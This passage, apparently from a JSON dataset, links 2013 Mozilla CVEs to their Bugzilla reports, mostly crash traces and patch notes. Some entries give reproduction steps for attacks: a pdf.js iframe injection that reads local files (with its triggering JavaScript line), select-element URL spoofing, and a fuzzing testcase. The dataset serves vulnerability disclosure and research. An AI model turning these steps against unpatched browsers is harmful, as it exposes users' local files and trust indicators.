0x58422D8: sctp_calculate_cksum (sctp_crc32.c:558) by 0x585F821: sctp_lowlevel_chunk_output (sctp_output.c:4808) by 0x586B084: sctp_send_initiate_ack (sctp_output.c:6295) by 0x584BE38: sctp_handle_init (sctp_input.c:217) by 0x5851BA8: sctp_process_control (sctp_input.c:4887) by 0x5855EE9: sctp_common_input_processing (sctp_input.c:5907) by 0x5891E30: usrsctp_conninput (user_socket.c:3189) by 0x58929E6: mozilla::DataChannelConnection::SctpDtlsInput(mozilla::TransportFlow*, unsigned char const*, unsigned long) (DataChannel.cpp:654) by 0x5891FC7: sigslot::_connection3<mozilla::MediaPipeline, mozilla::TransportLayer*, unsigned char const*, unsigned long, sigslot::single_threaded>::emit(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:1944) by 0x700FCD7: mozilla::TransportFlow::PacketReceived(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:2477) by 0x5891FC7: sigslot::_connection3<mozilla::MediaPipeline, mozilla::TransportLayer*, unsigned char const*, unsigned long, sigslot::single_threaded>::emit(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:1944) by 0x70185CD: sigslot::signal3<mozilla::TransportLayer*, unsigned char const*, unsigned long, sigslot::single_threaded>::operator()(mozilla::TransportLayer*, unsigned char const*, unsigned long) (sigslot.h:2477) Uninitialised value was created by a stack allocation at 0x586A486: sctp_send_initiate_ack (sctp_output.c:5652) (and a whole bunch more of the above, followed by a bunch of the following) Use of uninitialised value of size 8 at 0x115788E4: rijndael_encryptBlock128 (rijndael.c:577) by 0x11579458: rijndael_encryptCBC (rijndael.c:875) by 0x11579F13: AES_Encrypt (rijndael.c:1237) by 0x17B1269A: NSC_EncryptUpdate (pkcs11c.c:1000) by 0x4CD04C9: PK11_CipherOp (pk11cxt.c:700) by 0x4DDE1D8: ssl3_CompressMACEncryptRecord (ssl3con.c:2424) by 0x4DDAD82: dtls_CompressMACEncryptRecord (dtlscon.c:803) by 0x4DDE590: ssl3_SendRecord (ssl3con.c:2635) by 0x4DDE956: ssl3_SendApplicationData (ssl3con.c:2775) by 0x4DEE1C2: ssl_SecureSend (sslsecur.c:1304) by 0x4DF0BB1: ssl_Send (sslsock.c:2139) by 0x4C49868: PR_Send (priometh.c:194) Uninitialised value was created by a stack allocation at 0x586A486: sctp_send_initiate_ack (sctp_output.c:5652)"
      }
    ],
    "CVE-2013-5593": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=868327",
        "title": "Mozilla Firefox Navigation away from a page with an active <select> dropdown menu can be used for URL/SSL spoofing and ClickJacking Attacks",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Build ID: 20130409194949 Steps to reproduce: SELECT / OPTION elements may contain html contents and surpass the location bar and the box geolocation (for exemple), it is possible with these elements to make multiple attacks like SSL URL Spoofing and Clickjacking Actual results: The Location Bar and the SSL indicia are spoofed and the geolocation authorization can be bypassed. Expected results: Select/Option element surpass all other element ( location bar / geolocation box ...)"
      }
    ],
    "CVE-2013-5595": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=916580",
        "title": "Use of uninitialized memory, and buffer size computations not checked for overflow",
        "description": "I observed this use of uninitialized memory in the js shell running under valgrind on Ubuntu Precise x86-64: ==21933== Conditional jump or move depends on uninitialised value(s) ==21933== at 0x529A4E0: inflateReset2 (inflate.c:157) ==21933== by 0x529A5D8: inflateInit2_ (inflate.c:193) ==21933== by 0x816AE9: js::DecompressString(unsigned char const*, unsigned long, unsigned char*, unsigned long) (jsutil.cpp:132) ==21933== by 0x5ABDA4: JSRuntime::initSelfHosting(JSContext*) (SelfHosting.cpp:753) ==21933== by 0x6CDB95: js::NewContext(JSRuntime*, unsigned long) (jscntxt.cpp:201) ==21933== by 0x68B9B2: JS_NewContext(JSRuntime*, unsigned long) (jsapi.cpp:827) ==21933== by 0x416940: NewContext(JSRuntime*) (js.cpp:4914) ==21933== by 0x418CEB: main (js.cpp:5546) This bug is caused by code in jsutil.cpp allocating memory for zlib using regular malloc, where zlib expects the memory to be zeroed. While investigating this, I also noticed that the multiplication computing the buffer size for the malloc call is not checked for overflow. Informally looking around, I found a few other places that were performing unchecked multiplications to compute buffer sizes. Attached is a patch which fixes all of the bugs I found: The change in jsd_lock.cpp is a boring cleanup. The change in Utility.h introduces an overload of js_calloc with two arguments. This is used by the jsutil.cpp fixes described below. The changes in BaselineBailouts.cpp and IonCode.h add overflow checks on multiplications computing buffer sizes. It might be impossible to force overflows in these places, because other things would very likely fail first, but there wasn't anything explicitly protecting them. This patch explicitly protects them. The change in jsutil.cpp fixes two bugs: It zeros out the allocated memory, which fixes the uninitialized memory bug described above. And, it uses the two-argument calloc, allowing libc to check the multiplication for overflow."
      }
    ],
    "CVE-2013-5596": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=910881",
        "title": "Crash on long pages (neverending reddit with images enabled)",
        "description": "1. Install Reddit Enhancement Suite 2. Enable Neverending Reddit 3. Enable Inline Images 4. Click on 'Show Images' 5. Start browsing (17+ pages opened) 6. CRASH I don't think this is because of Reddit Enhancement Suite but that Firefox simply can't handle a page that gets this long with this amount of images and other content loaded."
      }
    ],
    "CVE-2013-5598": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=920515",
        "title": "pdf.js iframe injection allows sites to load local files or even chrome privileged pages into an iframe",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0 (Beta/Release) Build ID: 20130814063812 Steps to reproduce: I created and added an embed element to the document of a page initially setting the src attribute for the embed to 'data:application/pdf,'. This triggers the pdfjs implementation and begins to load it to preview the plugin. Immediately after I created an iframe element and appended it as a child of the embed element. Normally when previewing a pdf as a plugin, an anonymous iframe is created as a child of the embed element, but apparently any iframe that is a child of the embed element will behave as if bound to it for previewing. At this point all that is required is to change the src attribute of the embed element to whatever file(local or chrome privileged) that you want to load and then change the location of iframe.contentWindow like so: iframe.contentWindow.location = 'data:application/x-moz-playpreview-pdfjs;,'; This triggers code in PdfRedirector.js that is part of the pdfjs implementation, which checks the src attribute of the embed element and loads it into the frame as if it were a pdf document. Actual results: A local file was loaded into the iframe. Using this technique with canvas to get an image of the page or just trying to access iframe.contentWindow.location.href and catching the error from that, a person could either read the content of local files, or at least confirm their existence. A few extra notes on this, I think this has been possible since its been possible to load the new pdfjs implementation as a plugin, its confirmed to work all the way up to the newest nightly and a few other dated installs as well. I just discovered this yesterday, and I spent all the time I could spare trying to find ways to load up a chrome xul document and somehow achieve script injection into it. I'm sure that it's possible, but I don't have as much time as I've had before to sink into this, and since this is serious enough to have me worried, I went this route this morning. I really wanted that proper calc poc, and although this is nice its just not the same =/ Expected results: Since PdfRedirector.js is running with full chrome privileges, it should have a check before loading any data to make sure that the data is expected, and of the right type. If this is not the case it should cease loading and throw an exception."
      }
    ],
    "CVE-2013-5602": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=897678",
        "title": "ASAN SEGV on unknown address in Worker::SetEventListener",
        "description": "The attached testcase crashes the ASAN build of Firefox with the attached testcase. It involves event handlers and exchange of __proto__ attributes, similar to Bug 831090."
      }
    ],
    "CVE-2013-5604": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=914017",
        "title": "Stack-buffer-overflow in txXPathNodeUtils::getBaseURI",
        "description": "==12693==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff3757e180 at pc 0x7ffc253f35bf bp 0x7fff3757dbe0 sp 0x7fff3757dbd8 READ of size 8 at 0x7fff3757e180 thread T0 #0 0x7ffc253f35be in txXPathNodeUtils::getBaseURI(txXPathNode const&, nsAString_internal&) content/xslt/src/xpath/txMozillaXPathTreeWalker.cpp:569 #1 0x7ffc25419cc0 in txLoadedDocumentsHash::~txLoadedDocumentsHash() content/xslt/src/xslt/txExecutionState.cpp:39 #2 0x7ffc2541aa77 in txExecutionState::~txExecutionState() content/xslt/src/xslt/txExecutionState.cpp:94 #3 0x7ffc2545273c in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) content/xslt/src/xslt/txMozillaXSLTProcessor.cpp:679 #4 0x7ffc2804cfc1 in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #5 0x7ffc26242ece in Invoke js/xpconnect/src/XPCWrappedNative.cpp:2809 #6 0x7ffc26242ece in CallMethodHelper js/xpconnect/src/XPCWrappedNative.cpp:2149 #7 0x7ffc26242ece in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:2115 #8 0x7ffc2625506b in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1310 #9 0x7ffc2984ee0a in native js/src/jscntxtinlines.h:219 #10 0x7ffc2984ee0a in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:489 #11 0x7ffc29842069 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2459 #12 0x7ffc298309f1 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:446 #13 0x7ffc2985108b in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) js/src/vm/Interpreter.cpp:630 #14 0x7ffc298513e6 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/vm/Interpreter.cpp:666 #15 0x7ffc29a54c6d in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) js/src/jsapi.cpp:5120 #16 0x7ffc256b72ef in nsJSUtils::EvaluateString(JSContext*, nsAString_internal const&, JS::Handle<JSObject*>, JS::CompileOptions&, nsJSUtils::EvaluateOptions&, JS::Value*) dom/base/nsJSUtils.cpp:268 #17 0x7ffc256a5357 in nsJSContext::EvaluateString(nsAString_internal const&, JS::Handle<JSObject*>, JS::CompileOptions&, bool, JS::Value*) dom/base/nsJSEnvironment.cpp:993 #18 0x7ffc25662dfc in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) dom/base/nsGlobalWindow.cpp:10473 #19 0x7ffc256476d2 in nsGlobalWindow::RunTimeout(nsTimeout*) dom/base/nsGlobalWindow.cpp:10717 #20 0x7ffc2566203c in nsGlobalWindow::TimerCallback(nsITimer*, void*) dom/base/nsGlobalWindow.cpp:10964 #21 0x7ffc2800f9e1 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:546 #22 0x7ffc28010086 in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:630 #23 0x7ffc28005b39 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:622 #24 0x7ffc27f2d571 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:238 #25 0x7ffc26d38880 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:116 #26 0x7ffc28125253 in RunInternal ipc/chromium/src/base/message_loop.cc:220 #27 0x7ffc28125253 in RunHandler ipc/chromium/src/base/message_loop.cc:213 #28 0x7ffc28125253 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:187 #29 0x7ffc26b2201c in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:161 #30 0x7ffc265101ce in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:269 #31 0x7ffc2392f300 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3869 #32 0x7ffc2393023a in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3937 #33 0x7ffc2393116b in XRE_main toolkit/xre/nsAppRunner.cpp:4139 #34 0x45524d in do_main browser/app/nsBrowserApp.cpp:275 #35 0x45524d in main browser/app/nsBrowserApp.cpp:635 #36 0x7ffc32a9676c in #37 0x45483c in _start Address 0x7fff3757e180 is located in stack of thread T0 at offset 896 in frame #0 0x7ffc2545214f in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) content/xslt/src/xslt/txMozillaXSLTProcessor.cpp:629 This frame has 4 object(s): [32, 40) 'sourceDOMDocument' [96, 784) 'es' [832, 872) 'handlerFactory' [928, 936) 'doc' HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext (longjmp and C++ exceptions *are* supported) Shadow bytes around the buggy address: 0x100066ea7be0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100066ea7bf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100066ea7c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100066ea7c10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100066ea7c20: 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 f4 f4 f4 =>0x100066ea7c30:[f2]f2 f2 f2 00 f4 f4 f4 f3 f3 f3 f3 00 00 00 00 0x100066ea7c40: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 0x100066ea7c50: 00 00 00 00 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 0x100066ea7c60: 00 00 00 00 f3 f3 f3 f3 00 00 00 00 00 00 00 00 0x100066ea7c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100066ea7c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==12693==ABORTING"
      }
    ],
    "CVE-2013-5605": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=934016",
        "title": "Null_Cipher (used during handshake) does not respect maxOutputLen, copying an attacker-supplied # of bytes",
        "description": "The implementation of Null_Cipher uses PORT_Mempcy to copy data from the input buffer to the output buffer, as seen at http://mxr.mozilla.org/nss/source/lib/ssl/ssl3con.c#819 However, it does not validate or cap inputLen to be <= maxOutputLen. As a result, an attacker that sends a malformed SSL record may overwrite memory, including potentially memory on the stack."
      }
    ],
    "CVE-2013-5606": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=910438",
        "title": "CERT_VerifyCert returns SECSuccess (saying certificate is good) even for bad certificates, when the CERTVerifyLog log parameter is given",
        "description": "Calling Cert_VerifyCert on a trusted certificate with incompatible keyusages for the usage returns success if the verifylog parameter is not null and failure if the verifylog parameter is not null. I would prefer to fail always on bad key usages. The issue is on: http://mxr.mozilla.org/mozilla-central/source/security/nss/lib/certhigh/certvfy.c#1314 notice that if the certificate is trusted it will always exit... but on a bad key usage with no log, the function would have terminated earlier with fail on: http://mxr.mozilla.org/mozilla-central/source/security/nss/lib/certhigh/certvfy.c#1303"
      }
    ],
    "CVE-2013-5607": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=927687",
        "title": "Avoid unsigned integer wrapping in PL_ArenaAllocate",
        "description": "The attached patch for PL_ArenaAllocate ensures that the sums of unsigned integers don't wrap. Note that a->base, a->avail, and a->limit are of the PRUword type, an unsigned integer type large enough to hold a pointer. The patch relies on the invariant that a->base <= a->limit and a->avail <= a->limit."
      }
    ],
    "CVE-2013-5610": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=905903",
        "title": "Assertion failure: [barrier verifier] Unmarked edge: baseline-monitor-stub-ioncode, at gc/Verifier.cpp:570 with setObjectMetadataCallback",
        "description": "The following testcase asserts on mozilla-central revision a8daa428ccbc (run with --fuzzing-safe): var lfcode = new Array(); lfcode.push(\"\"); lfcode.push(\"\"); lfcode.push(\"1\"); lfcode.push(\"\"); lfcode.push(\"\"); lfcode.push(\"\"); lfcode.push(\"\"); lfcode.push(\"2\"); lfcode.push(\"gczeal(4);\"); lfcode.push(\"setObjectMetadataCallback(function(obj) {});\"); while (true) { var file = lfcode.shift(); if (file == undefined) { break; } loadFile(file) } function loadFile(lfVarx) { try { if (lfVarx.substr(-3) != \".js\" && lfVarx.length != 1) { switch (lfRunTypeId) { case 2: new Function(lfVarx)(); break; } } else if (!isNaN(lfVarx)) { lfRunTypeId = parseInt(lfVarx); } } catch (lfVare) { } }"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=890432",
        "title": "WebGL conformance-test-suite crash with long-expressions-should-not-crash [@glpCGNode]",
        "description": "Testcase: https://www.khronos.org/registry/webgl/sdk/tests/conformance/glsl/bugs/long-expressions-should-not-crash.html Stack: #0 0x00000001256ee609 in glpCGNode () #1 0x00000001256f03ad in glpCGPPStreamOpNode () #2 0x00000001256eff8f in glpCGNode () #3 0x00000001256f03ad in glpCGPPStreamOpNode () #4 0x00000001256eff8f in glpCGNode () [...] #4403 0x00000001256f03ad in glpCGPPStreamOpNode () #4404 0x00000001256eff8f in glpCGNode () #4405 0x00000001256f03ad in glpCGPPStreamOpNode () #4406 0x00000001256eff8f in glpCGNode () #4407 0x00000001256f03ad in glpCGPPStreamOpNode () [...] Tested with http://hg.mozilla.org/integration/mozilla-inbound/rev/a9d6d86a8090 Firefox 22 is also affected. Chipset Model: NVIDIA GeForce GT 650M Type: GPU Bus: PCIe PCIe Lane Width: x8 VRAM (Total): 1024 MB Vendor: NVIDIA (0x10de) Device ID: 0x0fd5 Revision ID: 0x00a2 ROM Revision: 3688 gMux Version: 3.2.19 [3.2.8] ProductName: Mac OS X ProductVersion: 10.8.4 BuildVersion: 12E55"
      }
    ],
    "CVE-2013-5612": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=871161",
        "title": "Potential XSS with cross-domain (cross-origin) inheritance of charset",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:20.0) Gecko/20100101 Firefox/20.0 Build ID: 20130409194949 Steps to reproduce: Using POST request, if the target page doesn't have charset information, Firefox inherits character encodings across domain. This is bad because it increases the potential of XSS. Please check the following page and confirm this behavior: http://l0.cm/fx_x-domain_inheritance.html Expected results: Firefox should not inherit the charset across domain."
      }
    ],
    "CVE-2013-5613": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=932449",
        "title": "Heap-use-after-free in mozilla::RestyleManager::GetHoverGeneration()",
        "description": "Tested in: OS: Ubuntu 12.04 Firefox: debug ASAN-build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan-debug/1383057658/ Repro-file has two parts. run.html opens repro.html in an iframe and reloads it with 400ms interval via onload-event. To reproduce the issue open run.html with Firefox and move mouse cursor into the area of the iframe on the page. ASAN-report: ==15391==ERROR: AddressSanitizer: heap-use-after-free on address 0x6170001e8f1c at pc 0x7f031be759fe bp 0x7ffffaed2b20 sp 0x7ffffaed2b18 READ of size 4 at 0x6170001e8f1c thread T0 #0 0x7f031be759fd in mozilla::RestyleManager::GetHoverGeneration() const /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/RestyleManager.h:75:0 #1 0x7f031be7594e in PresShell::DispatchSynthMouseMove(mozilla::WidgetGUIEvent*, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresShell.cpp:3416:0 #2 0x7f031be7f1b1 in PresShell::ProcessSynthMouseMoveEvent(bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresShell.cpp:5256:0 #3 0x7f031bea0d6d in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsRefreshDriver.cpp:1074:0 #4 0x7f031bea6d5d in mozilla::RefreshDriverTimer::Tick() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsRefreshDriver.cpp:160:0 #5 0x7f031eb1ccb6 in nsTimerImpl::Fire() /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsTimerImpl.cpp:546:0 #6 0x7f031eb1d45e in nsTimerEvent::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsTimerImpl.cpp:630:0 #7 0x7f031eb141ce in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/threads/nsThread.cpp:622:0 #8 0x7f031ea6501f in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/glue/nsThreadUtils.cpp:251:0 #9 0x7f031dc72e77 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/glue/MessagePump.cpp:85:0 #10 0x7f031ebff270 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:220:0 #11 0x7f031ebff074 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/ipc/chromium/src/base/message_loop.cc:187:0 #12 0x7f031da8dfd0 in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp:161:0 #13 0x7f031d5f7ad5 in nsAppStartup::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/components/startup/nsAppStartup.cpp:268:0 #14 0x7f031b438c3b in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:3976:0 #15 0x7f031b439fa8 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4044:0 #16 0x7f031b43a925 in XRE_main /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4246:0 #17 0x45a0f5 in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsBrowserApp.cpp:275:0 #18 0x459667 in main /builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsBrowserApp.cpp:635:0 #19 0x7f032bb8676c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226:0 #20 0x45937c in _start ??:0 0x6170001e8f1c is located 28 bytes inside of 760-byte region [0x6170001e8f00,0x6170001e91f8) freed by thread T0 here: #0 0x446285 in __interceptor_free _asan_rtl_:0 #1 0x7f031be5fc05 in operator delete(void*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/layout/base/../../dist/include/mozilla/mozalloc.h:225:0 #2 0x7f031be5fc05 in mozilla::RestyleManager::Release() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/RestyleManager.h:38:0 #3 0x7f031be5682d in nsRefPtr<mozilla::RestyleManager>::operator=(mozilla::RestyleManager*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/layout/base/../../dist/include/nsAutoPtr.h:943:0 #4 0x7f031be526aa in nsPresContext::SetShell(nsIPresShell*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresContext.cpp:1109:0 #5 0x7f031be66efd in PresShell::Destroy() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresShell.cpp:1058:0 #6 0x7f031be0cc56 in nsDocumentViewer::DestroyPresShell() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsDocumentViewer.cpp:4334:0 #7 0x7f031be0f3ba in nsDocumentViewer::Hide() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsDocumentViewer.cpp:2023:0 #8 0x7f031eefbc78 in nsDocShell::SetVisibility(bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsDocShell.cpp:5523:0 #9 0x7f031eefbcd3 in non-virtual thunk to nsDocShell::SetVisibility(bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsDocShell.cpp:5527:0 #10 0x7f031c489097 in nsFrameLoader::Hide() /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsFrameLoader.cpp:997:0 #11 0x7f031c031d78 in nsHideViewer::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsSubDocumentFrame.cpp:780:0 #12 0x7f031c3c4b6d in nsContentUtils::RemoveScriptBlocker() /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsContentUtils.cpp:4786:0 #13 0x7f031c406f1d in nsDocument::EndUpdate(unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsDocument.cpp:4471:0 #14 0x7f031c80cdc6 in nsHTMLDocument::EndUpdate(unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/html/document/src/nsHTMLDocument.cpp:2427:0 #15 0x7f031bf9ed7f in mozAutoDocUpdate::~mozAutoDocUpdate() /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/mozAutoDocUpdate.h:38:0 #16 0x7f031c4c36e7 in nsINode::doRemoveChildAt(unsigned int, bool, nsIContent*, nsAttrAndChildArray&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsINode.cpp:1522:0 #17 0x7f031c3626f7 in mozilla::dom::FragmentOrElement::RemoveChildAt(unsigned int, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/FragmentOrElement.cpp:963:0 #18 0x7f031c4bdc1b in nsINode::RemoveChild(nsINode&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsINode.cpp:458:0 #19 0x7f031e5b17b2 in mozilla::dom::NodeBinding::removeChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/dom/bindings/./NodeBinding.cpp:628:0 #20 0x7f031e5af0ed in mozilla::dom::NodeBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/dom/bindings/./NodeBinding.cpp:1231:0 #21 0x7f0320495683 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jscntxtinlines.h:220:0 #22 0x7f0320494d95 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/Interpreter.cpp:455:16 #23 0x7f03204889cd in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/Interpreter.cpp:2499:0 #24 0x7f032047766b in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/Interpreter.cpp:419:0 #25 0x7f0320494ee7 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/Interpreter.cpp:481:0 #26 0x7f0320495a4c in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/vm/Interpreter.cpp:512:0 #27 0x7f0320324228 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jsproxy.cpp:454:0 #28 0x7f03203ed791 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jswrapper.cpp:454:0 #29 0x7f0320337801 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jsproxy.cpp:2643:0 #30 0x7f032033b7f0 in proxy_Call(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/js/src/jsproxy.cpp:3037:0 previously allocated by thread T0 here: #0 0x4463c5 in malloc _asan_rtl_:0 #1 0x7f03258ee7d7 in moz_xmalloc /builds/slave/m-cen-l64-asan-d-0000000000000/build/memory/mozalloc/mozalloc.cpp:54:0 #2 0x7f031be56062 in operator new(unsigned long) /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/layout/base/../../dist/include/mozilla/mozalloc.h:201:0 #3 0x7f031be56062 in nsPresContext::Init(nsDeviceContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsPresContext.cpp:931:0 #4 0x7f031be0ead3 in nsDocumentViewer::Show() /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsDocumentViewer.cpp:1946:0 #5 0x7f031eefbc78 in nsDocShell::SetVisibility(bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsDocShell.cpp:5523:0 #6 0x7f031eefbcd3 in non-virtual thunk to nsDocShell::SetVisibility(bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/docshell/base/nsDocShell.cpp:5527:0 #7 0x7f031c48855d in nsFrameLoader::Show(int, int, int, int, nsSubDocumentFrame*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsFrameLoader.cpp:846:0 #8 0x7f031c02c295 in nsSubDocumentFrame::ShowViewer() 